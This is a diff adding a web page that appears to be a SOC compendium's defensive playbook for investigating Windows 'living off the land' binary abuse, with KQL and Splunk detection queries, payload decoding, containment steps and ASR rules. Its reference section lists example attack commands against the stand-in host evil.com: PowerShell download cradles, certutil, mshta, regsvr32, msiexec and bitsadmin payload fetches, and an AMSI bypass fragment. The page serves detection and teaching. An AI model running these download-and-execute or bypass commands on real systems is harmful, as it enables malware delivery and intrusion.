@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <base href="/NikDet/">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOLBins Investigation Playbook | SOC Compendium</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="main-nav">
+        <a href="index.html" class="nav-brand"><div class="brand-icon"><i class="fas fa-shield-halved"></i></div><div class="brand-text"><span class="brand-title">SOC Compendium</span><span class="brand-subtitle">Detection &amp; Operations</span></div></a>
+    </nav>
+    <main class="main-content">
+        <div class="content-page">
+            <div class="breadcrumb">
+                <a href="index.html">Home</a><span class="separator">/</span>
+                <a href="pages/playbooks/index.html">Playbooks</a><span class="separator">/</span>
+                <a href="pages/playbooks/investigation/index.html">Investigation</a><span class="separator">/</span>
+                <span>LOLBins</span>
+            </div>
+
+            <h1><i class="fas fa-tools"></i> Living off the Land (LOLBins) Investigation Playbook</h1>
+            <p class="lead">Complete investigation workflow for attacks using legitimate system binaries for malicious purposes - PowerShell, certutil, mshta, rundll32, and more.</p>
+
+            <div class="content">
+                <!-- WHY THIS MATTERS -->
+                <h3 id="why-matters"><i class="fas fa-exclamation-circle"></i> Why This Investigation Matters</h3>
+                
+                <div class="info-box danger">
+                    <div class="info-box-title"><i class="fas fa-skull-crossbones"></i> LOLBins Evade Traditional Security</div>
+                    <table>
+                        <thead><tr><th>Challenge</th><th>Why It's Hard</th><th>Investigation Approach</th></tr></thead>
+                        <tbody>
+                            <tr><td>Legitimate binaries</td><td>Can't block - needed for administration</td><td>Focus on unusual parameters/context</td></tr>
+                            <tr><td>Signed by Microsoft</td><td>Bypasses application whitelisting</td><td>Behavioral analysis, not signature</td></tr>
+                            <tr><td>No malware dropped</td><td>Nothing for AV to detect</td><td>Command line and process tree analysis</td></tr>
+                            <tr><td>Fileless techniques</td><td>Memory-only execution</td><td>Script block logging, ETW</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3>Common LOLBins Categories</h3>
+                <table>
+                    <thead><tr><th>Category</th><th>Binaries</th><th>Malicious Use</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>Script Execution</strong></td><td>powershell, cmd, wscript, cscript, mshta</td><td>Run malicious scripts/commands</td></tr>
+                        <tr><td><strong>Download/Transfer</strong></td><td>certutil, bitsadmin, curl, wget</td><td>Download malware/tools</td></tr>
+                        <tr><td><strong>Execution Proxy</strong></td><td>rundll32, regsvr32, msiexec</td><td>Execute arbitrary code</td></tr>
+                        <tr><td><strong>Code Compilation</strong></td><td>csc.exe, msbuild, installutil</td><td>Compile and run malicious code</td></tr>
+                        <tr><td><strong>Credential Access</strong></td><td>ntdsutil, vssadmin, reg.exe</td><td>Dump credentials/hashes</td></tr>
+                        <tr><td><strong>Discovery</strong></td><td>nltest, dsquery, net.exe</td><td>Enumerate AD/network</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- TRIGGERS -->
+                <h3 id="when-to-use"><i class="fas fa-clock"></i> When to Use This Playbook</h3>
+
+                <table>
+                    <thead><tr><th>Trigger</th><th>Source</th><th>Priority</th><th>First Action</th></tr></thead>
+                    <tbody>
+                        <tr><td style="color: #f85149;"><strong>PowerShell with encoded command</strong></td><td>EDR, Script Block Logging</td><td>HIGH</td><td>Decode and analyze payload</td></tr>
+                        <tr><td style="color: #f85149;"><strong>certutil downloading file</strong></td><td>Command line monitoring</td><td>HIGH</td><td>Identify downloaded file, isolate</td></tr>
+                        <tr><td style="color: #f0883e;"><strong>Unusual parent-child process</strong></td><td>Process monitoring</td><td>HIGH</td><td>Trace full process tree</td></tr>
+                        <tr><td style="color: #f0883e;"><strong>mshta/wscript network connection</strong></td><td>Network + process correlation</td><td>HIGH</td><td>Identify remote content</td></tr>
+                        <tr><td style="color: #d29922;"><strong>regsvr32 with URL</strong></td><td>Command line alert</td><td>MEDIUM</td><td>Analyze remote script</td></tr>
+                        <tr><td style="color: #d29922;"><strong>Scheduled task with suspicious command</strong></td><td>Task scheduler logs</td><td>MEDIUM</td><td>Review task details</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- LOLBIN REFERENCE -->
+                <h3 id="reference"><i class="fas fa-book"></i> LOLBins Reference</h3>
+
+                <h3>PowerShell Abuse Patterns</h3>
+                <div class="info-box">
+                    <div class="info-box-title"><i class="fas fa-terminal"></i> Suspicious PowerShell Indicators</div>
+                    <pre><code># Encoded commands (obfuscation)
+powershell -enc [base64]
+powershell -encodedcommand [base64]
+powershell -e [base64]
+
+# Download cradles
+IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
+Invoke-Expression (Invoke-WebRequest -Uri 'http://evil.com/script.ps1')
+IEX (iwr 'http://evil.com/script.ps1')
+
+# Bypass execution policy
+powershell -ep bypass
+powershell -executionpolicy bypass
+Set-ExecutionPolicy Bypass -Scope Process
+
+# Hidden window
+powershell -w hidden
+powershell -windowstyle hidden
+
+# AMSI bypass attempts
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+amsiInitFailed</code></pre>
+                </div>
+
+                <h3>certutil Abuse Patterns</h3>
+                <div class="info-box">
+                    <div class="info-box-title"><i class="fas fa-download"></i> certutil Malicious Usage</div>
+                    <pre><code># Download file
+certutil -urlcache -split -f http://evil.com/malware.exe C:\temp\malware.exe
+certutil -urlcache -f http://evil.com/payload.txt C:\temp\payload.txt
+
+# Decode base64 (used to decode downloaded payload)
+certutil -decode encoded.txt decoded.exe
+
+# Encode (used to exfiltrate data)
+certutil -encode secret.txt encoded.txt
+
+# Legitimate use (for comparison)
+certutil -verify certificate.cer
+certutil -store My</code></pre>
+                </div>
+
+                <h3>Other Common LOLBins</h3>
+                <table>
+                    <thead><tr><th>Binary</th><th>Malicious Pattern</th><th>Detection Focus</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>mshta.exe</strong></td><td><code>mshta http://evil.com/payload.hta</code></td><td>Network connections, child processes</td></tr>
+                        <tr><td><strong>rundll32.exe</strong></td><td><code>rundll32 javascript:"\..\mshtml,RunHTMLApplication"</code></td><td>Unusual DLL paths, script execution</td></tr>
+                        <tr><td><strong>regsvr32.exe</strong></td><td><code>regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll</code></td><td>Network URLs in command line</td></tr>
+                        <tr><td><strong>msiexec.exe</strong></td><td><code>msiexec /q /i http://evil.com/malware.msi</code></td><td>Remote MSI installation</td></tr>
+                        <tr><td><strong>bitsadmin.exe</strong></td><td><code>bitsadmin /transfer job /download http://evil.com/file</code></td><td>Download jobs to suspicious paths</td></tr>
+                        <tr><td><strong>wmic.exe</strong></td><td><code>wmic process call create "powershell..."</code></td><td>Process creation, remote execution</td></tr>
+                        <tr><td><strong>cmstp.exe</strong></td><td><code>cmstp.exe /s /ns C:\temp\evil.inf</code></td><td>INF file execution</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- INVESTIGATION STEPS -->
+                <h3 id="investigation"><i class="fas fa-search"></i> Investigation Steps</h3>
+
+                <h3>Step 1: Detect LOLBin Activity</h3>
+
+                <h4>KQL - Suspicious PowerShell Execution</h4>
+                <pre><code>// Detect encoded PowerShell commands
+DeviceProcessEvents
+| where TimeGenerated > ago(7d)
+| where FileName =~ "powershell.exe" or FileName =~ "pwsh.exe"
+| where ProcessCommandLine has_any (
+    "-enc", "-encodedcommand", "-e ", 
+    "-w hidden", "-windowstyle hidden",
+    "-ep bypass", "-executionpolicy bypass",
+    "IEX", "Invoke-Expression",
+    "DownloadString", "DownloadFile",
+    "Net.WebClient", "Invoke-WebRequest",
+    "FromBase64String", "Reflection.Assembly"
+)
+| project TimeGenerated, DeviceName, AccountName, 
+    ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated desc</code></pre>
+
+                <h4>KQL - certutil Download Detection</h4>
+                <pre><code>// Detect certutil being used to download files
+DeviceProcessEvents
+| where TimeGenerated > ago(7d)
+| where FileName =~ "certutil.exe"
+| where ProcessCommandLine has_any (
+    "-urlcache", "-split", "-f http", "-f https",
+    "-decode", "-encode"
+)
+| project TimeGenerated, DeviceName, AccountName,
+    ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc</code></pre>
+
+                <h4>KQL - Suspicious Process Parent-Child</h4>
+                <pre><code>// Detect unusual parent-child process relationships
+DeviceProcessEvents
+| where TimeGenerated > ago(24h)
+| where InitiatingProcessFileName in~ (
+    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",  // Office
+    "mshta.exe", "wscript.exe", "cscript.exe",  // Script hosts
+    "wmiprvse.exe"  // WMI
+)
+| where FileName in~ (
+    "powershell.exe", "cmd.exe", "certutil.exe", 
+    "rundll32.exe", "regsvr32.exe", "msiexec.exe"
+)
+| project TimeGenerated, DeviceName, AccountName,
+    InitiatingProcessFileName, FileName, ProcessCommandLine
+| order by TimeGenerated desc</code></pre>
+
+                <h4>KQL - Comprehensive LOLBin Detection</h4>
+                <pre><code>// Detect multiple LOLBin categories
+let SuspiciousCommands = DeviceProcessEvents
+| where TimeGenerated > ago(24h)
+| extend LOLBinType = case(
+    // Download
+    FileName =~ "certutil.exe" and ProcessCommandLine has "-urlcache", "Download-certutil",
+    FileName =~ "bitsadmin.exe" and ProcessCommandLine has "/transfer", "Download-bitsadmin",
+    FileName =~ "curl.exe" or FileName =~ "wget.exe", "Download-utility",
+    // Execution proxy
+    FileName =~ "mshta.exe" and ProcessCommandLine has "http", "Exec-mshta",
+    FileName =~ "rundll32.exe" and ProcessCommandLine has_any ("javascript", "vbscript"), "Exec-rundll32",
+    FileName =~ "regsvr32.exe" and ProcessCommandLine has "/i:http", "Exec-regsvr32",
+    // Encoded PowerShell
+    FileName =~ "powershell.exe" and ProcessCommandLine has "-enc", "PS-encoded",
+    // WMI
+    FileName =~ "wmic.exe" and ProcessCommandLine has "process call create", "WMI-execution",
+    ""
+)
+| where LOLBinType != "";
+SuspiciousCommands
+| summarize Count = count(), Devices = make_set(DeviceName) by LOLBinType
+| order by Count desc</code></pre>
+
+                <h4>SPL - LOLBin Detection (Splunk)</h4>
+                <pre><code>index=endpoint sourcetype=sysmon EventCode=1
+| eval lolbin_type=case(
+    match(process_name, "(?i)certutil\.exe") AND match(command_line, "(?i)urlcache"), "Download-certutil",
+    match(process_name, "(?i)powershell\.exe") AND match(command_line, "(?i)-enc"), "PS-encoded",
+    match(process_name, "(?i)mshta\.exe") AND match(command_line, "(?i)http"), "Exec-mshta",
+    match(process_name, "(?i)rundll32\.exe") AND match(command_line, "(?i)javascript"), "Exec-rundll32",
+    match(process_name, "(?i)wmic\.exe") AND match(command_line, "(?i)process call create"), "WMI-exec",
+    true(), "other"
+)
+| where lolbin_type!="other"
+| stats count by host, lolbin_type, process_name, command_line
+| sort -count</code></pre>
+
+                <h3>Step 2: Decode and Analyze Payload</h3>
+
+                <h4>PowerShell - Decode Base64 Command</h4>
+                <pre><code># Decode PowerShell encoded command
+$encoded = "BASE64_STRING_HERE"
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
+
+# If double-encoded
+$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decoded))
+
+# CyberChef recipe for complex encoding:
+# From Base64 → Remove null bytes → Decode text</code></pre>
+
+                <h4>KQL - Extract and Decode PowerShell</h4>
+                <pre><code>// Extract base64 from PowerShell commands
+DeviceProcessEvents
+| where TimeGenerated > ago(24h)
+| where FileName =~ "powershell.exe"
+| where ProcessCommandLine has "-enc"
+| extend EncodedPart = extract(@"-e[ncodedcommand]*\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
+| where isnotempty(EncodedPart)
+| extend DecodedCommand = base64_decode_tostring(EncodedPart)
+| project TimeGenerated, DeviceName, EncodedPart, DecodedCommand</code></pre>
+
+                <h3>Step 3: Trace Full Attack Chain</h3>
+
+                <h4>KQL - Process Tree Analysis</h4>
+                <pre><code>// Build process tree for suspicious activity
+let SuspiciousProcess = DeviceProcessEvents
+| where TimeGenerated > ago(24h)
+| where ProcessCommandLine has "certutil" and ProcessCommandLine has "-urlcache"
+| project DeviceName, SuspiciousProcessId = ProcessId, SuspiciousTime = TimeGenerated;
+// Find parent processes
+DeviceProcessEvents
+| where TimeGenerated > ago(24h)
+| join kind=inner SuspiciousProcess on DeviceName
+| where ProcessId == SuspiciousProcessId or InitiatingProcessId == SuspiciousProcessId
+| project TimeGenerated, DeviceName, 
+    ProcessName = FileName, 
+    ProcessCommandLine,
+    ParentProcess = InitiatingProcessFileName,
+    ParentCommandLine = InitiatingProcessCommandLine
+| order by TimeGenerated asc</code></pre>
+
+                <h3>Step 4: Check for Persistence</h3>
+
+                <h4>KQL - LOLBin in Persistence Mechanisms</h4>
+                <pre><code>// Check if LOLBins are used in persistence
+union
+(
+    DeviceRegistryEvents
+    | where TimeGenerated > ago(7d)
+    | where RegistryKey has_any ("Run", "RunOnce", "Winlogon")
+    | where RegistryValueData has_any ("powershell", "cmd", "mshta", "wscript", "certutil")
+    | project TimeGenerated, DeviceName, Mechanism = "Registry", Details = RegistryValueData
+),
+(
+    DeviceProcessEvents
+    | where TimeGenerated > ago(7d)
+    | where FileName =~ "schtasks.exe"
+    | where ProcessCommandLine has_any ("powershell", "cmd", "mshta", "wscript")
+    | project TimeGenerated, DeviceName, Mechanism = "ScheduledTask", Details = ProcessCommandLine
+),
+(
+    DeviceFileEvents
+    | where TimeGenerated > ago(7d)
+    | where FolderPath has "Startup"
+    | where FileName endswith ".bat" or FileName endswith ".cmd" or FileName endswith ".ps1"
+    | project TimeGenerated, DeviceName, Mechanism = "StartupFolder", Details = FileName
+)
+| order by TimeGenerated desc</code></pre>
+
+                <!-- CONTAINMENT -->
+                <h3 id="containment"><i class="fas fa-shield-alt"></i> Containment Actions</h3>
+
+                <table>
+                    <thead><tr><th>Finding</th><th>Immediate Action</th><th>Long-term Mitigation</th></tr></thead>
+                    <tbody>
+                        <tr>
+                            <td style="color: #f85149;"><strong>Active download/execution</strong></td>
+                            <td>Isolate endpoint, kill process</td>
+                            <td>Block URL/IP at perimeter</td>
+                        </tr>
+                        <tr>
+                            <td style="color: #f85149;"><strong>Persistence established</strong></td>
+                            <td>Remove persistence, scan system</td>
+                            <td>Deploy ASR rules</td>
+                        </tr>
+                        <tr>
+                            <td style="color: #f0883e;"><strong>Encoded PowerShell</strong></td>
+                            <td>Decode, assess intent, investigate user</td>
+                            <td>Constrained Language Mode</td>
+                        </tr>
+                        <tr>
+                            <td style="color: #d29922;"><strong>Suspicious but inconclusive</strong></td>
+                            <td>Enhanced monitoring, user interview</td>
+                            <td>Improve detection rules</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Attack Surface Reduction (ASR) Rules</h4>
+                <pre><code># Enable ASR rules to block common LOLBin abuse
+# Block Office from creating child processes
+Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled
+
+# Block Office from creating executable content
+Add-MpPreference -AttackSurfaceReductionRules_Ids 3B576869-A4EC-4529-8536-B80A7769E899 -AttackSurfaceReductionRules_Actions Enabled
+
+# Block JavaScript/VBScript from launching downloaded content
+Add-MpPreference -AttackSurfaceReductionRules_Ids D3E037E1-3EB8-44C8-A917-57927947596D -AttackSurfaceReductionRules_Actions Enabled
+
+# Block process creations from PSExec and WMI
+Add-MpPreference -AttackSurfaceReductionRules_Ids D1E49AAC-8F56-4280-B9BA-993A6D77406C -AttackSurfaceReductionRules_Actions Enabled
+
+# Block execution of potentially obfuscated scripts
+Add-MpPreference -AttackSurfaceReductionRules_Ids 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC -AttackSurfaceReductionRules_Actions Enabled</code></pre>
+
+                <!-- MITRE MAPPING -->
+                <h3 id="mitre"><i class="fas fa-map"></i> MITRE ATT&CK Mapping</h3>
+
+                <table>
+                    <thead><tr><th>Technique ID</th><th>Technique Name</th><th>LOLBins Used</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>T1059.001</strong></td><td>PowerShell</td><td>powershell.exe, pwsh.exe</td></tr>
+                        <tr><td><strong>T1059.003</strong></td><td>Windows Command Shell</td><td>cmd.exe</td></tr>
+                        <tr><td><strong>T1059.005</strong></td><td>Visual Basic</td><td>wscript.exe, cscript.exe</td></tr>
+                        <tr><td><strong>T1218.005</strong></td><td>Mshta</td><td>mshta.exe</td></tr>
+                        <tr><td><strong>T1218.010</strong></td><td>Regsvr32</td><td>regsvr32.exe</td></tr>
+                        <tr><td><strong>T1218.011</strong></td><td>Rundll32</td><td>rundll32.exe</td></tr>
+                        <tr><td><strong>T1105</strong></td><td>Ingress Tool Transfer</td><td>certutil.exe, bitsadmin.exe</td></tr>
+                        <tr><td><strong>T1047</strong></td><td>Windows Management Instrumentation</td><td>wmic.exe</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- PREVENTION -->
+                <h3 id="prevention"><i class="fas fa-shield-virus"></i> Prevention Recommendations</h3>
+
+                <table>
+                    <thead><tr><th>Control</th><th>Implementation</th><th>What It Blocks</th></tr></thead>
+                    <tbody>
+                        <tr><td><strong>PowerShell Constrained Language</strong></td><td>AppLocker + WDAC policies</td><td>Advanced PowerShell techniques</td></tr>
+                        <tr><td><strong>Script Block Logging</strong></td><td>Enable via GPO</td><td>Improves detection (not prevention)</td></tr>
+                        <tr><td><strong>ASR Rules</strong></td><td>Microsoft Defender ASR</td><td>Common LOLBin abuse patterns</td></tr>
+                        <tr><td><strong>Application Whitelisting</strong></td><td>AppLocker, WDAC</td><td>Execution from unusual paths</td></tr>
+                        <tr><td><strong>Command Line Logging</strong></td><td>Enable process command line in events</td><td>Improves detection</td></tr>
+                        <tr><td><strong>AMSI Integration</strong></td><td>Ensure AMSI is enabled</td><td>Script-based attacks</td></tr>
+                    </tbody>
+                </table>
+
+                <!-- RESOURCES -->
+                <h3 id="resources"><i class="fas fa-external-link-alt"></i> External Resources</h3>
+
+                <ul>
+                    <li><strong>LOLBAS Project:</strong> lolbas-project.github.io - Comprehensive LOLBins database</li>
+                    <li><strong>GTFOBins:</strong> gtfobins.github.io - Linux equivalent</li>
+                    <li><strong>MITRE ATT&CK:</strong> attack.mitre.org - Technique details</li>
+                </ul>
+
+                <!-- RELATED -->
+                <h3 id="related"><i class="fas fa-link"></i> Related Playbooks</h3>
+
+                <div class="card-grid">
+                    <a href="pages/playbooks/investigation/malware.html" class="card"><div class="card-icon"><i class="fas fa-virus"></i></div><h3>Malware Investigation</h3><p>When LOLBin delivers payload</p></a>
+                    <a href="pages/playbooks/hunting/defense-evasion.html" class="card"><div class="card-icon"><i class="fas fa-eye-slash"></i></div><h3>Defense Evasion Hunt</h3><p>Proactive LOLBin detection</p></a>
+                    <a href="pages/playbooks/hunting/persistence.html" class="card"><div class="card-icon"><i class="fas fa-anchor"></i></div><h3>Persistence Hunt</h3><p>LOLBins in persistence</p></a>
+                    <a href="pages/log-analysis/windows-events.html" class="card"><div class="card-icon"><i class="fab fa-windows"></i></div><h3>Windows Events</h3><p>Process logging reference</p></a>
+                </div>
+
+            </div>
+        </div>
+        <footer class="main-footer"><p>© 2025 SOC & Detection Engineering Compendium</p></footer>
+    </main>
+    <script src="js/main.js"></script>
+</body>
+</html>
